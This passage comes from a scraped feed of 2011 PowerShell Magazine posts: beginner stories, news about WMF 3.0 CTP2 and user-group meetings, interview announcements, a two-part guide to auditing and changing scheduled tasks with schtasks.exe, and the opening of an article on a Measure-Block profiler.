hate it at all.\nThis is my PowerShell story!\nWould you like to share your story? Win one of TrainSignal’s PowerShell training courses? Learn more about the “How I Learned to Stop Worrying and Love Windows PowerShell” contest.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/09/my-powershell-journey/","tags":["Learning PowerShell"],"title":"My PowerShell Journey"},{"categories":["News"],"contents":"Join the UK PowerShell User Group virtual meeting at Thursday, Dec 15, 2011 7:30 PM (GMT), and discover how to use the WSMAN cmdlets to retreive WMI information and see a demo of the new WMI API’s CIM cmdlets in PowerShell v3 CTP 2.\nNotes\nRichard Siddaway has invited you to attend an online meeting using Live Meeting.\nJoin the meeting.\n Audio Information\nComputer Audio\nTo use computer audio, you need speakers and microphone, or a headset.\n First Time Users:\nTo save time before the meeting, check your system to make sure it is ready to use Microsoft Office Live Meeting.\n Troubleshooting\nUnable to join the meeting? Follow these steps:\nCopy this address and paste it into your web browser:\nhttps://www.livemeeting.com/cc/usergroups/join\nCopy and paste the required information:\nMeeting ID: PJSH3M\nEntry Code: gG/C-75(m\nLocation: https://www.livemeeting.com/cc/usergroups\nIf you still cannot enter the meeting, contact support\nNotice\nMicrosoft Office Live Meeting can be used to record meetings. By participating in this meeting, you agree that your communications may be monitored or recorded at any time during the meeting.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/08/wsman-wmi-and-cim-at-the-uk-powershell-user-group/","tags":["News"],"title":"WSMAN, WMI, and CIM at the UK PowerShell User Group"},{"categories":["Learning PowerShell"],"contents":"By way of introduction, I am the Software Services Manager at Patrick Henry College, a Christian liberal arts school in Virginia, USA. I have about 25 years in IT, the last 15 years primarily spent developing collaborative applications in IBM Lotus Notes. Over the last 6 years, I expanded my skill set to include web technologies, MS SQL, SSIS and SSRS and now spend a good deal of my time on database administration.\nOur student email used to run on a Mirapoint appliance until about two years ago when we moved to a hosted solution with Live@Edu. I was tasked with automating the account creation and synchronization of data between our MSSQL based Student Information System and Live@Edu. This was my introduction to PowerShell. Being familiar with scripting languages, it was a question of learning the syntax.\nSince I had already deployed a few solutions using SQL Server Integration Services, I set out to create an SSIS project that would create the .csv file from the Student Information System (SIS) and use that file as the input for the PowerShell script. Microsoft provides a sample script (CSV_Parser.ps1) and a sample .csv file that can be downloaded from http://go.microsoft.com/fwlink/?LinkID=142060. Using this sample script, with some slight modifications, I was able to automate the account creation and also set up a PowerShell script job that ran on a periodic basis to synchronize account information between the SIS and Live@Edu. I also wrote PowerShell scripts to create and populate distribution groups each semester based on enrollment, gender and dorm. Another script was to import the faculty/staff Directory from IBM Lotus Domino into the Live@Edu External Contacts. As our staff are added or deleted in Lotus, the external contacts on the Live@Edu get updated by a scheduled SQL server job which calls a corresponding PowerShell script.\nMore recently, we had the need to create an alumni domain, set up an alumni alias for the student account if the student record in the SIS had the student as having graduated from Patrick Henry College and finally make that alias the Primary SMTP address for the student (while preserving any other proxy addresses that might have existed). Most of you PowerShell gurus would probably find this quite elementary, but for the newbies, this is what I ended up doing.\nAt first I was attempting to use the -PrimarySMTPAddress like this:\n$Temp = Get-Mailbox -Identity testuser $Temp.EmailAddresses += \u0026#39;testuser@alumni.phc.edu\u0026#39; Set-Mailbox $Temp.Name -EmailAddresses $Temp.EmailAddresses Set-Mailbox $Temp.Name -PrimarySmtpAddress \u0026#39;testuser@alumni.phc.edu\u0026#39; Shay Levy, who is a PowerShell MVP was kind enough to help me troubleshoot the error I kept getting when I used this script and we ended up determining that -PrimarySMTPAddress is not a supported cmdlet parameter. To determine the list of supported cmdlet parameters, I ran the following command:\nPS\u0026gt; (Get-Command Set-Mailbox).Parameters.Keys Microsoft gives this example on how to change the primary email address of an existing user:\nPS\u0026gt; Set-Mailbox \u0026lt;Identity\u0026gt; -EmailAddresses SMTP:\u0026lt;new primary e-mail address\u0026gt;,\u0026lt;user ID\u0026gt;,\u0026lt;existing proxy address 1\u0026gt;,\u0026lt;existing proxy address 2\u0026gt; So I modified the original script to:\n$Temp = Get-Mailbox -Identity testuser $Temp.EmailAddresses += \u0026#39;SMTP:testuser@alumni.phc.edu\u0026#39; Set-Mailbox $Temp.Name -EmailAddresses $Temp.EmailAddresses This set the alumni address as the primary, retained the proxy address that was in place and added the old student.phc.edu address to the proxy address list. The final change I had to make was to set up the script to use my .csv file as input and dynamically pass values.\nforeach($line in $csv) { $EmailAddresses = @{Name=\u0026#39;EmailAddresses\u0026#39;;Expression={($_.EmailAddresses -cmatch \u0026#39;smtp\u0026#39;) -join \u0026#39;;\u0026#39;}} $Emailadd = Get-Mailbox $Line.UserID | Select-Object Name, Alias, PrimarySmtpAddress, $EmailAddresses if ($Emailadd.PrimarySmtpAddress -notlike \u0026#39;*@alumni.phc.edu\u0026#39;) { # add a second email address (alias) for these students in Outlook who # have graduated from PHC and do not have an alumni.phc.edu alias # and make the alumni.phc.edu account the primary email address,  # while retaining any proxy addresses that might exist. $AlumniAddress = $line.NewAddress $NewPrimaryAddress = \u0026#39;SMTP:\u0026#39;+$line.NewAddress $StudentAddress=$line.UserID $Temp = Get-Mailbox -Identity $Line.Name $Temp.EmailAddresses += $NewPrimaryAddress Set-Mailbox $Temp.Name -EmailAddresses $Temp.EmailAddresses } } Not too hard once you figure out the right parameters to use.\nI am very grateful to Karl Mitschke, whose blog at http://unlockpowershell.wordpress.com is extremely useful and also to Shay Levy who has his blog at http://PowerShay.com\nMore resources can be found at:\nhttp://social.technet.microsoft.com/wiki/contents/articles/windows-powershell-survival-guide.aspx\nhttp://technet.microsoft.com/en-us/scriptcenter/dd742419\nIf your student email is being hosted at Live@Edu, this resource will be very useful to you:\nhttp://blogs.technet.com/b/educloud/archive/tags/powershell/\nSince I had a background programming with LotusScript and JavaScript, it was not that hard to learn PowerShell. With the help of the numerous examples available on the web, I was able to quickly come up with functional PowerShell code. Perhaps it would have been even easier if Live@Edu provided more resources on using PowerShell that are specific to their Exchange environment. I encourage those of you who are new to PowerShell to look into using it. It is extremely powerful and easy to deploy, especially in conjunction with SQL Server. I hope you have benefited from this article and that it encourages you to give PowerShell a test drive.\nWould you like to share your story? Win one of TrainSignal’s PowerShell training courses? Learn more about the “How I Learned to Stop Worrying and Love Windows PowerShell” contest.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/07/teaching-an-old-dog-new-tricks-liveedu-and-windows-powershell/","tags":["Learning PowerShell"],"title":"Teaching an old dog new tricks – Live@Edu and Windows PowerShell"},{"categories":["News"],"contents":"In this webcast, Mike Pfeiffer , a Microsoft Exchange MVP, shows how you can take control of your messaging environment using the Exchange Management Shell. You’ll see how to take your administrative capabilities to a new level by creating recipients in bulk, updating organization wide configuration settings, and generating detailed reports, all in a matter of seconds with simple commands.\nHead on to Idera’s website to view the recording.\nYou can find more PowerShell webcasts in Idera’s PowerShell Webcast Archive.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/07/webcast-enterprise-exchange-management-with-powershell/","tags":["News"],"title":"Webcast: Enterprise Exchange Management with PowerShell"},{"categories":["Learning PowerShell"],"contents":"I was asked by a PowerShell Rock Star, Shay Levy, to forward on my very first experiences with PowerShell. Why I started to use it in the first place and what resources I employed to solve my first scripting problems.\nIt all started one fateful night about 3 years ago, I had been supporting a major software release for the company I was working for at the time. The company that I was then employed by wrote Social Networks for large organizations. One such client in particular came to us and asked that we produce an entire social networking site for one of their small business credit card offerings. My company jumped at the chance to provide such an important service to a multinational, financial institution. The code was written and the site was deployed. Now needless to say since I was on the server administration team for my company, it was put very black and white that the SLA for this website COULD NOT BE VIOLATED. If the client at any time felt we were not living up to expectations, they could take all the code we had written and say have a nice day. As I said, the site was deployed and all worked as expected until… the one thing that should not be an issue, became a major issue. People started to use the site!\nAs traffic increased an interesting scenario started to arise. A random series of events was causing the WWW service on the network load balanced web farm servers to spin off into oblivion. This meant that any request from the load balancer to that web server while it was in this condition would result in a broken page and generally a 404 error or a blank webpage. A blank page or a 404 error needless to say was not part of the SLA for this huge client. These issues needed to be fixed quickly. As these errors started to happen, my admin team went about attempting to find out why the issue was occurring in the first place. We found some artifacts and forwarded them back to the development team to work on a fix. In the meantime, we developed a process to mitigate the error state as quickly as possible. Here were the steps involved:\n (If offsite or off hours) VPN into the office, then VPN into the production network in Orlando. Once connected to the Prod Network, log in to F5 load balancer. Find the offending server in the active F5 resource pool. Mark the NODE down so that all connections would bleed off the offending server and would not allow new request from the NLB to be directed to the problematic server. Once all connections bled to 0. We simply reset IIS on the box. Once IIS was reset, we ran a quick simple test, and then place the box back in the resource pool.  Now what I didn\u0026rsquo;t mention before is that 90% of the time these boxes were exhibiting this behavior was during the middle of the night. This went on for about 3 weeks and then I figured there must be something else that can be done. So, one night after bouncing one of the servers, I couldn\u0026rsquo;t get back to sleep. Since I was awake anyway, I logged into the F5 development site. I saw a new article about something called an F5 PowerShell snap-in.\nThis intrigued me. I had heard of PowerShell a little bit. I knew it was much more C#-based than the horrible VBScripting I had been doing. I started to look at the documentation for the snap-in and found a script that had the building blocks of what I needed to do to automate the whole process of recovering from the error. It truly took me about a week of pouring over the documentation and finding sample scripts before i had something even close to working. Then one very early morning I had to get up again to fix the error on a box and I knew it was time to finish the script. It had been nearly 2 full weeks without a full night’s sleep, and it was getting painful. I finished the script that day and wouldn\u0026rsquo;t you know it the condition\narose again the next day. Perfect test time and it worked like a charm.\nIn conclusion, I tell people even now when they ask me about scripting, that you will do it through the GUI until it hurts. Then you will script it. There has to be a reason to script. I don’t\nwrite scripts just to script, there has to be a problem to solve. GO FIND A PROBLEM AND SOLVE IT WITH POWERSHELL :o)\n–@ScriptWarrior\nWould you like to share your story? Win one of TrainSignal’s PowerShell training courses? Learn more about the “How I Learned to Stop Worrying and Love Windows PowerShell” contest.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/05/scriptwarriors-first-powershell-experiences/","tags":["Learning PowerShell"],"title":"ScriptWarrior's First PowerShell Experiences"},{"categories":["News"],"contents":"The PowerShell team has announced the release  of Windows Management Framework 3.0 CTP2. The new build contains Windows PowerShell 3.0, WMI and WinRM, and is available to be installed on Windows 7 SP1 and Windows Server 2008 R2 SP1.\nIMPORTANT: If you have WMF3.0 CTP1 installed, you must uninstall it before installing CTP2.\nOverview of changes since WMF 3.0 CTP1   Customer Reported Bug Fixes: Many customer reported bugs have been fixed since the WMF 3.0 CTP1. The release notes contains a list of bug titles, but please check Connect for full details.\n  Single Command Pane in Windows PowerShell ISE: The Command and Output panes in Windows PowerShell ISE have been combined into a single Command pane that looks and behaves like the Windows PowerShell console.\n  Updatable Help: The WMF 3.0 CTP1 release notes described a new Updatable Help system in Windows PowerShell 3.0 and included a copy of the help content. The Updatable Help system is now active on the Internet. To download and update help files, type: Update-Help.\n  Windows PowerShell Workflows: A number of enhancements have been made in the scripting experience for Windows PowerShell Workflows, including new keywords: Parallel, Sequence \u0026amp; Inlinescript. A document describing these changes will be published to the download page shortly.\n  Remote Get-Module: The Get-Module cmdlet now supports implicit remoting. You can now use the new PSSession and CIMSession parameters of the Get-Module cmdlet to get the modules in any remote session or CIM session. A number of other module enhancements are listed in the release notes.\n  Feedback \u0026amp; Bugs We welcome any feedback or bug submissions to the Windows PowerShell Connect site: http://connect.microsoft.com/PowerShell\nAdditional Information: This software is a pre-release version. Features and behavior are likely to change before the final release. You can download CTP2 HERE.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/03/windows-management-framework-3-0-community-technology-preview-ctp-2-is-here/","tags":["News"],"title":"Windows Management Framework 3.0 Community Technology Preview (CTP) 2 is here"},{"categories":["Learning PowerShell"],"contents":"Once upon a time, right before the 2010 Scripting Games, the Microsoft Scripting Guy, Ed Wilson was thinking out loud about the challenges he would use for the 2010 Scripting Games. As he was talking to himself at the lunch table, he mentioned his idea for one challenge to me the Scripting Wife, Teresa. I am not an IT person but have been exposed to several scenarios over the years both at work and at home. I have spent most of my working life in the accounting arena, either processing invoices or payroll or both. Some of the words Ed was using seemed to be advanced for the beginner category and I mentioned that to Ed. One thing led to another and the next thing I know he is announcing via Twitter that I was going to participate in the 2010 Scripting Games. (Naturally, I entered for fun and the learning experience, I am not eligible for prizes nor did I want to be considered for any of the prizes).\nWe started with Ed sitting down with my PC and me and worked through some training exercises. The first command I typed was Get-Pr  for Get-Process. You can read all the lessons and my entries for the Scripting Games for 2010 and 2011 here. I continue to have training sessions with Ed from time to time but I do not script on a regular basis. I also intentionally do not remember what he teaches me so that I can be a beginner again next year and we will go through the process again. I really enjoy being able to work with Ed on these scenarios in order to encourage other beginners that they too can learn Windows PowerShell.\nOne of the main things I see is Windows PowerShell is so much different to actually sit in front of the keyboard typing commands instead of just reading about them. Ed has written more than 10 books and many Hey Scripting Guy blogs and I have read just about every word he has written. To actually type a command and see the results is an entirely different way of seeing things than to just read the words. I encourage anyone who is just starting out to actually try the commands and not just read about them. HOWEVER, be very careful to do this is a controlled manner and have an idea of what you are asking the commands to do. You do not want to mess up your computer or your network. Most of the things in Windows PowerShell are obvious if you know what a verb and a noun are. Use Get-Command to learn what commands are available, Stop-Computer is self-explanatory.\nSince 2010 I have gotten more involved in the Windows PowerShell community and continue to learn more from a broader perspective. I volunteer as the scheduler for the guests on the PowerScripting podcast with MVP Hal Rottenberg and Jonathan Walz. I usually log into the chat room while the podcast is being recorded and learn the specialties of the guests and audience. One thing I am beginning to really understand is this phrase that I have heard Ed and others use—PowerShell is PowerShell is PowerShell. No matter if you use Windows PowerShell for SQL, Exchange, SharePoint, or Active Directory, PowerShell is still the same at the root of the script. Once you learn the syntax you can use Windows PowerShell for whatever product you need.\nMy latest adventure is helping MVP Jim Christopher start up the Charlotte PowerShell Users Group. So you can see I still am mostly an administrative assistant more than an IT admin but there is a spot for all of us in the Windows PowerShell community.\nWould you like to share your story? Win one of TrainSignal’s PowerShell training courses? Learn more about the “How I Learned to Stop Worrying and Love Windows PowerShell” contest.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/01/how-the-scripting-wife-got-started/","tags":["Learning PowerShell"],"title":"How the Scripting Wife Got Started"},{"categories":["Call For Authors","Learning PowerShell"],"contents":"PowerShell Magazine is starting a series of posts with personal stories about people’s PowerShell beginnings entitled “How I Learned to Stop Worrying and Love Windows PowerShell”.\nWe would like to hear about your first days with PowerShell—how hard/easy it was to start using it, the biggest issues, why have you looked at PowerShell in the first place, the resources that you used in the beginning of the learning curve…. You don’t need to be an expert to participate and write this kind of article. Quite the opposite, we welcome stories from users with all levels of experience. You do not need any previous writing experience. 🙂\nOne thing is for sure—new users will appreciate your effort. Let’s face it, PowerShell was once a completely new tool for all of us.\nThanks to TrainSignal, an award-winning provider of computer-based training courses for IT professionals, we have prepared some nice prizes for you. One out of ten PowerShell community writers (PowerShell MVPs and Microsoft employees are not eligible for getting prizes) will be able to choose one of TrainSignal’s PowerShell courses:\n Windows PowerShell Fundamentals Training by Jeff Hicks Windows Server 2008 PowerShell Training by Jeff Hicks Exchange Server 2007 PowerShell Training by Scott Lowe  Please, use the Write For Us link to submit your article as a markdown document.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/11/29/call-for-writers-share-your-experiences-and-help-new-users/","tags":["Learning PowerShell"],"title":"Call for Writers: Share Your Experiences and Help New Users"},{"categories":["How To"],"contents":"In Part 1 we looked at gathering information about the scheduled tasks in your environment, in part 2 we will look at how to make changes to the scheduled tasks, and fixing a “problem” with scheduled tasks created in the 2008(R2) Task Scheduler GUI.\nChanging passwords on scheduled tasks Again we turn our attention to PowerShell and schtasks.exe. schtasks.exe has a parameter called /change, which as the name implies, allows you to change a scheduled task. As I am looking at this from a security perspective, the only thing the script is able to change is the username and password.\nfunction Set-ScheduledTask { [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact=\u0026#39;High\u0026#39;)] param ( [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)] [Alias(\u0026#34;HOSTNAME\u0026#34;)] [String[]] $ComputerName, [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)] [Alias(\u0026#34;Run As User\u0026#34;)] [String[]] $RunAsUser, [Parameter(Mandatory = $true)] [String[]] $Password, [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)] [String[]] $TaskName ) Process { Write-Verbose \u0026#34;Updating: $($_.\u0026#39;TaskName\u0026#39;)\u0026#34; if ($pscmdlet.ShouldProcess($computername, \u0026#34;Updating Task: $TaskName \u0026#34;)) { Write-Verbose \u0026#34;schtasks.exe /change /s $ComputerName /RU $RunAsUser /RP $Password /TN `\u0026#34;$TaskName`\u0026#34;\u0026#34; $strcmd = schtasks.exe /change /s \u0026#34;$ComputerName\u0026#34; /RU \u0026#34;$RunAsUser\u0026#34; /RP \u0026#34;$Password\u0026#34; /TN \u0026#34;`\u0026#34;$TaskName`\u0026#34;\u0026#34; 2\u0026gt;\u0026amp;1 Write-Host $strcmd } } } The script accepts pipeline input, so you can pipe your results directly from Get-ScheduledTask to Set-ScheduledTask (Make sure you have narrowed down the result of Get-ScheduledTask, to only the tasks you want to change, otherwise, you will end up with a lot of tasks that won’t run).\nAs an added security against accidentally changing all scheduled task across your domain, I am using another PowerShell v2 advanced function functionality :\nPS\u0026gt; [CmdletBinding(SupportsShouldProcess = $true, ConfirmImpact = \u0026#39;High\u0026#39;)] This tells PowerShell that the function supports the –WhatIf and –Confirm parameters, so if you do:\nPS\u0026gt; Get-ScheduledTask | Set-ScheduledTask –Password VerySecurePWD –WhatIf It will output to the screen which tasks it is going to try to change, but not actually do anything. Also,setting ConfirmImpact=’High’, means that you will be prompted for a confirmation before any task is changed. If you are really sure what you are doing, or want to run the script unattended, you can always supply –Confirm:$False to the function like this:\nPS\u0026gt; Get-ScheduledTask | Set-ScheduledTask –Password VerySecurePWD –Confirm:$false This will change the password on all the scheduled tasks found by Get-ScheduledTask. You can also use Set-ScheduledTask with parameters, if you just want to change a single scheduled task.\nPS\u0026gt; Set-ScheduledTask -Computername localhost -TaskName mytask -RunAsUser mydomain\\Administrator -Password VerySecurePWD The above example will change the scheduled task mytask on the local machine to run under the Administrator account in mydomain with a password called VerySecurePWD.\nOne last thing I would like to mention, which I spent quite a lot of time figuring out, is that scheduled tasks created in the GUI on Windows Server 2008 and Server 2008 R2 cannot readily be changed by schtasks.exe. After a lot of digging, I found that when you create a scheduled task in the GUI, it uses a time format which uses 7 decimals for showing seconds (I guess that is down to 1.000.000th of a second), but schtasks.exe cannot handle that format. So, when you try to change a scheduled task that was created in the GUI, it will give you a following error message:\nERROR: The parameter is incorrect.\nSo, if you are seeing error messages like that one, it is probably because tasks were created from the GUI.\nThe only way I have found to “fix” this issue is to export the task as an XML file, then alter the XML directly and then re-import the scheduled task overwriting the existing one.\nFunction Set-2k8ScheduledTask { [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact=\u0026#39;High\u0026#39;)] param ( [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)] [Alias(\u0026#34;HOSTNAME\u0026#34;)] [String[]] $ComputerName, [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)] [String[]] $TaskName ) Begin { $ShortDate = [regex]\u0026#34;(?[0-9]{4}[/.-](?:1[0-2]|0[1-9])[/.-](?:3[01]|[12][0-9]|0[1-9])T(?:2[0-3]|[01][0-9])[:.][0-5][0-9][:.][0-5][0-9])(?\\.\\d*)\u0026#34; } Process { $XMLIn = schtasks /query /s $ComputerName /tn $TaskName /xml if (Test-Path \u0026#34;$Env:TEMP\\$($TaskName).xml\u0026#34;) { Remove-Item \u0026#34;$Env:TEMP\\$($TaskName).xml\u0026#34; } foreach ($line in $XMLIn) { if ($line -match \u0026#34;$ShortDate\u0026#34;) { $line = [regex]::Replace($line, $ShortDate,$($Matches[\u0026#34;Shortdate\u0026#34;])) } if ($line.length -gt 1) { $line | Out-File -Append -FilePath \u0026#34;$Env:TEMP\\$($TaskName).xml\u0026#34; } } if ($pscmdlet.ShouldProcess($ComputerName,\u0026#34;Fixing Task: $TaskName \u0026#34;)) { Write-Verbose \u0026#34;Commandline: schtasks /Create /tn $TaskName /XML $Env:TEMP\\$($TaskName).xml /f\u0026#34; schtasks /Create /tn $TaskName /XML \u0026#34;$Env:TEMP\\$($TaskName).xml\u0026#34; /f } Write-Verbose \u0026#34;Removing $Env:TEMP\\$($TaskName).xml\u0026#34; if (Test-Path \u0026#34;$Env:TEMP\\$($TaskName).xml\u0026#34;) { Remove-Item \u0026#34;$Env:TEMP\\$($TaskName).xml\u0026#34; } } } I have enabled the –WhatIf option again, and have chosen to prompt the user for each task that is to be changed. The script accepts pipeline info, so here again you can pipe results from Get-ScheduledTask into it, and it can be used with parameters to change a single task.\nI know there are other ways to access scheduled task information (using the Scheduled Task COM object or WMI), but in my testing I have found the most powerful tool is still the schtasks.exe because it works the same way all the way back to Windows 2000, even though it does have some problems with tasks created in Server 2008/2008 R2.\nDownload the scripts for this article here.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/11/22/managing-scheduled-tasks-in-your-environment-part-ii/","tags":["How To","Scheduled Tasks"],"title":"Managing scheduled tasks in your environment – Part II"},{"categories":["How To"],"contents":"In Part 1 of the series, I will look at getting information on the scheduled tasks running in your environment. One of the things I see a lot in our company is that a lot of scheduled tasks get created on different servers, for one reason or another, but very often these tasks are quickly forgotten.\nWe kept seeing files show up in a directory they were not supposed to be in, and when we deleted them, they magically reappear after some time. That led me to believe that it was a scheduled task that was the culprit. So I thought, it was time to get an overview of what scheduled tasks were running in our environment. I had to figure out how to query all the servers in our environment and enumerate enabled scheduled tasks.\nI looked at several different ways of getting this information, but in the end I settled on using the built-in schtasks.exe utility and wrapping it in PowerShell function for automation. I started looking at the command line switches for schtasks.exe. I experimented with the different output formats until I noticed that there was an option to output in CSV format, and as you may already know PowerShell has built-in cmdlets for working with CSV files. So, I ended up doing:\nPS\u0026gt; schtasks.exe /query /V /FO CSV | ConvertFrom-Csv This returned a collection of PSCustomObjects that contained information about all the scheduled tasks on my local system. This is all for a single system, but we have 200+ servers, so some more automation was required. The schtasks.exe also supports getting information from remote machines using the /s switch, so that made it rather easy to create a loop that goes through a list of servers. The schtasks.exe works against down-level operating systems back to Windows 2000.\nAnother thing I had to consider was how to design my script and what data I should return. Should I return all the information schtasks.exe /query /V /FO CSV gave me, or just a subset of it? I decided to return all 28 properties of each scheduled task. With 28 properties, I quickly decided not to manually create a PSObject, and use Add-Member to populate its properties, but to use a new feature native to PowerShell v2 —the option to supply a hash table of properties to the New-Object cmdlet. To simplify the example, I assume that a list containing server names are available and is named servers.txt.\nfunction Get-ScheduledTask { [CmdletBinding()] param ( [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)] [String[]] $ComputerName, [Parameter(Mandatory = $false)] [String[]] $RunAsUser, [Parameter(Mandatory = $false)] [String[]] $TaskName, [Parameter(Mandatory = $false)] [alias(\u0026#34;WS\u0026#34;)] [Switch] $WithSpace ) Begin { $Script:Tasks = @() } Process { $schtask = schtasks.exe /query /s $ComputerName /V /FO CSV | ConvertFrom-Csv Write-Verbose \u0026#34;Getting scheduled Tasks from: $ComputerName\u0026#34; if ($schtask) { foreach($sch in $schtask) { if ($sch.\u0026#34;Run As User\u0026#34; -match \u0026#34;$($RunAsUser)\u0026#34; -and $sch.TaskName -match \u0026#34;$($TaskName)\u0026#34;) { Write-Verbose \u0026#34;$Computername ($sch.TaskName).replace(\u0026#39;\\\u0026#39;,\u0026#39;\u0026#39;) $sch.\u0026#39;Run As User\u0026#39;\u0026#34; $sch | Get-Member -MemberType Properties | ForEach -Begin { $hash = @{}} -Process { if ($WithSpace) { ($hash.($_.Name)) = $sch.($_.Name) } else { ($hash.($($_.Name).replace(\u0026#34; \u0026#34;,\u0026#34;\u0026#34;))) = $sch.($_.Name) } } -End { $Script:Tasks += (New-Object -TypeName PSObject -Property $hash) } } } } } End { $Script:Tasks } } The script accepts pipeline input, so you can do something like:\nPS\u0026gt; Get-Content c:\\servers.txt | Get-ScheduledTask | Out-GridView If you want to get only scheduled tasks that are run under the Administrator account you could do something like this:\nPS\u0026gt; Get-Content c:\\servers.txt | Get-ScheduledTask –RunAsUser administrator | Out-GridView The above example will list all scheduled tasks running under an account containing the word “Administrator”. If you want to get only scheduled tasks where the task name contains “FileXfer”:\nPS\u0026gt; Get-Content c:\\servers.txt | Get-ScheduledTask –TaskName FileXfer | Out-GridView You can of course also combine the two:\nPS\u0026gt; Get-Content c:\\servers.txt | Get-ScheduledTask –TaskName FileXfer –RunAsUser administrator A few things to notice though is that since the properties that are returned are generated “on-the-fly” using the names used by schtasks.exe, some of them contain spaces. Property names should almost never contain spaces, so by default I remove all spaces in the properties, before I create the hash table. A property returned from schtasks.exe called “Run As User” ends up being RunAsUser instead. I have added an option to keep the spaces by supplying the parameter -WithSpace, it will make your output easier to read, if you for instance pipe it to Out-GridView\nPS\u0026gt; Get-Content c:\\servers.txt | Get-ScheduledTask | Select TaskName \u0026#34;RunAsUser\u0026#34; In the above examples the –RunAsUser parameter looks at the property called “RunAsUser”. But it is only called that in the English versions of the operating system. So, if you are not running this on a machine running English version of the operating system, you will need to manually modify the script to your local locale.\nLast but not least, both the -RunAsUser and -TaskName parameters use regular expressions to match a user and a task name, so, for instance, if you are looking for a scheduled tasks called like CopyJob1, CopyJob2 you can do:\nPS\u0026gt; Get-ScheduledTask –TaskName CopyJob\\d #\\d is regex for a single digit Regular expressions are a whole book for themselves, so I will not go into details on it here. Now we have seen how to collect information about scheduled tasks in your environment, but what if you want to change something on existing scheduled tasks? As I mentioned earlier, we tend to see quite a few scheduled tasks in our environment, and sometimes they get created to run under admin accounts (The quick and dirty way of getting things done).\nOur company policy states that admin accounts have to have their passwords changed every 3 months. So we looked for a way to automate those changes as well.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/11/21/managing-scheduled-tasks-in-your-environment-part-i/","tags":["How To","Scheduled Tasks"],"title":"Managing scheduled tasks in your environment – Part I"},{"categories":["Interviews"],"contents":"During the PowerShell Deep Dive at The Experts Conference (TEC) Europe 2011 in Frankfurt, Germany, Aleksandar Nikolic, one of the editors of the PowerShell Magazine, conducted a series of short video interviews with PowerShell experts. All of them were asked the same three questions:\n What is your favourite feature in PowerShell v3? Is there anything that you are still missing in PowerShell? How do you see the future of PowerShell and what could be done to ensure faster adoption of PowerShell?  As you can see, he’s cheated a little, and asked them four questions. 😉\nWe hope you will enjoy the interviews as much as we have enjoyed being at the first European PowerShell Deep Dive conference.\nThe PowerShell Experts video series concludes with the interview with Peter Monadjemi, a PowerShell trainer from Munich, Germany. In this video, Peter shared his views on PowerShell v3 and the future of PowerShell.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/11/18/an-interview-with-powershell-expert-peter-monadjemi/","tags":["Interviews"],"title":"An interview with PowerShell expert Peter Monadjemi"},{"categories":["Interviews"],"contents":"During the PowerShell Deep Dive at The Experts Conference (TEC) Europe 2011 in Frankfurt, Germany, Aleksandar Nikolic, one of the editors of the PowerShell Magazine, conducted a series of short video interviews with PowerShell experts. All of them were asked the same three questions:\n What is your favourite feature in PowerShell v3? Is there anything that you are still missing in PowerShell? How do you see the future of PowerShell and what could be done to ensure faster adoption of PowerShell?  As you can see, he’s cheated a little, and asked them four questions. 😉\nWe hope you will enjoy the interviews as much as we have enjoyed being at the first European PowerShell Deep Dive conference.\nThe PowerShell Experts video series continues with the interview with Brandon Shell, a PowerShell MVP famously known for his BSonPosh Module. In this video, Brandon shared his views on PowerShell v3 and the future of PowerShell.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/11/17/an-interview-with-powershell-expert-brandon-shell/","tags":["Interviews"],"title":"An interview with PowerShell expert Brandon Shell"},{"categories":["Interviews"],"contents":"During the PowerShell Deep Dive at The Experts Conference (TEC) Europe 2011 in Frankfurt, Germany, Aleksandar Nikolic, one of the editors of the PowerShell Magazine, conducted a series of short video interviews with PowerShell experts. All of them were asked the same three questions:\n What is your favourite feature in PowerShell v3? Is there anything that you are still missing in PowerShell? How do you see the future of PowerShell and what could be done to ensure faster adoption of PowerShell?  As you can see, he’s cheated a little, and asked them four questions. 😉\nWe hope you will enjoy the interviews as much as we have enjoyed being at the first European PowerShell Deep Dive conference.\nThe PowerShell Experts video series continues with the interview with James Brundage, famously known for his PowerShellPack and ShowUI work. In this video, James shared his views on PowerShell v3 and the future of PowerShell.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/11/16/an-interview-with-powershell-expert-james-brundage/","tags":["Interviews"],"title":"An interview with PowerShell expert James Brundage"},{"categories":["Performance"],"contents":"Introducing Measure-Block Sometimes things just don’t work as expected. When scripts get really complicated, performance bottlenecks can be hard to find. A lot of times you can nail down the issue by wrapping a Measure-Command around questionable portions of the script. This can be time consuming. Because of this I started developing a new advanced function: Measure-Block. Measure-Block can be placed anywhere with your PowerShell script. Wrapping a script block with Measure-Block statements integrated into it with another Measure-Block statement and utilizing the –Process parameter will yield a detailed profiling report of the different sub-sections within the script that you choose to profile. Sounds complicated so here’s an example:\nPS\u0026gt; New-Alias -Name MB -Value Measure-Block function TestScript() { MB { $variable = MB { Get-Process } -PassThru MB { foreach($var in $variable) { MB { $var | Format-Table } } } } } PS\u0026gt; 